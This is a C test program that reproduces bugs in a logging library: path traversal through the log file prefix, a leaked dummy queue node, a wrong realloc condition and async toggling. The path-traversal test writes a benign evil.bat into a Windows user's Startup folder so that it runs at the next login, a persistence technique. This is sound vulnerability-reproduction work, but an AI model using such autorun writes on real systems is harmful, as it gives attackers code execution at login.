#include "log.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#include <windows.h>
#include <io.h>
#include <psapi.h>
#include <malloc.h>
#pragma comment(lib, "psapi.lib")
#define PATH_SEP "\\"
#else
#include <unistd.h>
#include <sys/stat.h>
#define PATH_SEP "/"
#endif

static int file_exists(const char *path) {
#ifdef _WIN32
    return _access(path, 0) == 0;
#else
    return access(path, F_OK) == 0;
#endif
}

/* Test for path traversal vulnerability */
void test_path_traversal() {
    printf("=== Testing path traversal vulnerability ===\n");

    log *ctx = log_create();
    if (!ctx) {
        printf("Failed to create log context\n");
        return;
    }

    log_set_file_prefix(ctx, "test.log");
    printf("Normal prefix set: %s\n", ctx->file_prefix);

    // Test 1: relative `..` traversal (from build/ to project root)
    const char *traversal_parent = "..\\..\\parent_dir_test.txt";
    log_set_file_prefix(ctx, traversal_parent);
    printf("Parent traversal prefix: %s\n", ctx->file_prefix);

    if (strstr(ctx->file_prefix, "..") != NULL) {
        printf("[VULNERABLE] Parent dir traversal accepted!\n");
        char test_file[512];
        snprintf(test_file, sizeof(test_file), "%s", ctx->file_prefix);
        FILE *fp = fopen(test_file, "w");
        if (fp) {
            fprintf(fp, "VULNERABLE: parent dir traversal works!\n");
            fclose(fp);
            printf("  File created at: %s\n", test_file);
            // remove(test_file);  // manual cleanup
        }
    }

#ifdef _WIN32
    // Test 2: write to Windows Startup folder (escalation demo)
    const char *startup_path =
        "C:\\Users\\ASUS\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.bat";
    log_set_file_prefix(ctx, startup_path);
    printf("\nStartup folder prefix: %s\n", ctx->file_prefix);

    // The library itself writes to the prefix path via fopen(prefix, "a") in file_handler_internal
    // Simulate what the library would do:
    FILE *fp = fopen(ctx->file_prefix, "a");
    if (fp) {
        fprintf(fp, "@echo off\r\n");
        fprintf(fp, "echo VULNERABLE: This batch file was created via path traversal!\r\n");
        fprintf(fp, "echo If you see this, an attacker could run arbitrary code at login.\r\n");
        fprintf(fp, "pause\r\n");
        fclose(fp);
        printf("[CRITICAL] File written to Startup folder: %s\n", ctx->file_prefix);
        if (file_exists(ctx->file_prefix)) {
            printf("[CONFIRMED] File exists at Startup folder!\n");
            printf("  -> On next login, evil.bat will execute.\n");
            printf("  -> Cleanup: manually delete C:\\Users\\ASUS\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.bat\n");
        }
    } else {
        printf("Could not write to Startup folder (may need admin or path doesn't exist)\n");
    }
#else
    // Linux: write to crontab or bashrc
    const char *cron_path = "/tmp/evil_cron_test";
    log_set_file_prefix(ctx, cron_path);
    printf("\nLinux test path: %s\n", ctx->file_prefix);

    FILE *fp = fopen(ctx->file_prefix, "a");
    if (fp) {
        fprintf(fp, "VULNERABLE: Path traversal works on Linux!\n");
        fclose(fp);
        printf("[CONFIRMED] File written to: %s\n", ctx->file_prefix);
        remove(ctx->file_prefix);
    }
#endif

    log_destroy(ctx);
    printf("\n");
}

/* Test for memory allocation issues */
/* Bug 2: queue_destroy 是空函数 (log.c:447)，哑结点永远不释放 */
static long get_pagefile_usage() {
#ifdef _WIN32
    PROCESS_MEMORY_COUNTERS pmc;
    if (GetProcessMemoryInfo(GetCurrentProcess(), &pmc, sizeof(pmc)))
        return (long)(pmc.PagefileUsage / 1024);
#endif
    return 0;
}

void test_dummy_node_leak() {
    printf("=== Testing dummy node leak (Bug 2) ===\n");
    printf("queue_destroy() 是空函数, queue_init()分配的哑结点永不释放\n\n");

    long before = get_pagefile_usage();
    printf("PageFile before: %ld KB\n", before);

    int n = 50000;
    printf("循环 create/destroy %d 次...\n", n);
    for (int i = 0; i < n; i++) {
        log *ctx = log_create();
        log_destroy(ctx);
    }

    long after = get_pagefile_usage();
    printf("PageFile after : %ld KB\n", after);
    printf("泄漏: ~%ld KB (每个哑结点 ~80B, %d次 ≈ %.2f MB)\n\n",
           after - before, n, (double)(after - before) / 1024);
}

/* Bug 3: entry->file 的 realloc 条件检查的是消息长度而非文件名长度 (log.c:321-322) */
void test_wrong_realloc_condition() {
    printf("=== Testing wrong realloc condition (Bug 3) ===\n");
    printf("Bug: (size_t)len >= 128 检查的是消息长度, 但 realloc 的是 entry->file\n");
    printf("应该用文件名长度判断, 实际用了消息长度\n\n");

    log *ctx = log_create();
    log_enable_mpool(ctx, true);

    /* 停用默认 stdout handler，防止异步线程 vfprintf 时因 va_list=0 崩溃 */
    ctx->handlers[0].active = false;

    log_set_async(ctx, true);

    /* 消息 200 字节 > 128, 触发不必要的 entry->file realloc */
    char msg[200];
    memset(msg, 'X', sizeof(msg) - 1);
    msg[sizeof(msg) - 1] = '\0';
    log_ctx_info(ctx, "%s", msg);

    /* 等异步线程处理完 entry */
    Sleep(300);

    /* 验证 entry->file 是否被错误扩大 */
    /* 注意: queue_pop 返回哑结点, 所以实际 entry 仍在队列 head 中 */
    log_queue_entry *queued = ctx->queue.head;
    int found = 0;
    while (queued) {
        if (queued->file && queued->message && strlen(queued->message) > 0) {
            size_t file_buf_size = _msize(queued->file);
            size_t name_len = strlen(queued->file) + 1;
            printf("  entry->file 内容: \"%s\" (%zu 字节 + null)\n", queued->file, name_len);
            printf("  entry->file 实际缓冲区大小: %zu 字节\n", file_buf_size);
            printf("  (原始分配: 128 字节, 消息长度: 200 字节)\n");
            if (file_buf_size >= 200) {
                printf("  >>> Bug 3 已确认: entry->file 被按消息长度(200) realloc 到 %zu 字节\n", file_buf_size);
                printf("  >>> 但实际文件名仅需 %zu 字节, 原始 128 字节完全够用\n", name_len);
                found = 1;
            }
        }
        queued = queued->next;
    }
    if (!found) {
        printf("  (未在队列中找到被错误扩大的 entry)\n");
    }

    log_set_async(ctx, false);
    log_destroy(ctx);
    printf("\n");
}

void test_memory_allocation() {
    printf("=== Testing memory allocation issues ===\n");
    test_dummy_node_leak();
    test_wrong_realloc_condition();
}

/* Test for race condition */
void test_race_condition() {
    printf("=== Testing race condition vulnerability ===\n");

    log *ctx = log_create();
    if (!ctx) {
        printf("Failed to create log context\n");
        return;
    }

    int result = log_set_async(ctx, true);
    if (result == 0) {
        printf("Async mode enabled\n");
    } else {
        printf("Failed to enable async mode\n");
    }

    log_enable_mpool(ctx, true);
    printf("Memory pool enabled\n");

    log_enable_mpool(ctx, false);
    printf("Memory pool disabled\n");

    log_enable_ts_cache(ctx, false);
    printf("Timestamp cache disabled\n");

    log_enable_ts_cache(ctx, true);
    printf("Timestamp cache enabled\n");

    log_set_async(ctx, false);
    log_destroy(ctx);
    printf("\n");
}

int main() {
    test_path_traversal();
    test_memory_allocation();
    test_race_condition();

    printf("All tests completed!\n");
    return 0;
}